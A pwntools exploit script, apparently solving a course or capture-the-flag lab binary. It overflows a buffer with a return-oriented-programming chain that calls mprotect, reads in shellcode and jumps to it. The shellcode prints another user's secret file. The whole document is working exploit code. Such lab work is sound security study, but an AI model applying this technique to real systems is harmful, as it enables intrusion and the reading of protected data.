#!/usr/bin/env python3
from pwn import *

context.arch = "i686"

file_binary = "10126_ZELENIN_Vladyslav"

# FOR LINUX
env = {'LD_PRELOAD': 'libc.so.6', 'LD_ASLR': 'off'}
r = process(['setarch', '-R', './10126_ZELENIN_Vladyslav'], env = env)
pause()

# FOR WSL2


file_breakpoints = "breaks32.gdb"
# r = run_exploit(True, file_breakpoints)

sc = asm(shellcraft.cat('10100_ILIN_Mykola.secret') + shellcraft.echo('\n') + shellcraft.exit(13))

# GADGETS
rnop = p32(0x08071934)  # ret
peax = p32(0x080b0e7a)  # pop eax; ret
peaxedxebx = p32(0x080585e8)  # pop eax; pop edx; pop ebx; ret
mecxeax = p32(0x08093ec8)  # mov ecx, eax; mov eax, ecx; ret
syscall = p32(0x08071940)  # int 0x80; ret

rwx = p32(0x08048000)
overflow = 329
buf = b'A' * overflow
buf += p32(1337)
buf += rnop * 300

# mprotect rwx
buf += peax
buf += p32(0x1000)
buf += mecxeax
buf += peaxedxebx  # ecx = 0x1000, size
buf += p32(0x7d)  # eax = 0x7d, syscall mprotect
buf += p32(7)  # edx = 7, rwx
buf += rwx  # ebx = buf
buf += syscall

# read shellcode
buf += peax
buf += rwx
buf += mecxeax
buf += peaxedxebx
buf += p32(3)  # eax, syscall read
buf += p32(len(sc))  # edx, size
buf += p32(0)  # ebx, fd
buf += syscall

# jump shellcode
buf += rwx

buf = buf.ljust(1653, b'B')
# buf += p32(0xffffd000)
# buf += p32(0xDDDDDDDD)
buf += p32(0xffffd900)

# buf = cyclic(6000)
log.info('=== buffer')
# print(hexdump(buf))
r.readline()
r.writeline(buf)
r.readuntil(b'GRANTED!')

log.info('=== shellcode')
print(hexdump(sc))
r.writeline(sc)

# r.interactive()
log.success(f'FLAG {r.readall().strip().decode("ascii")}')
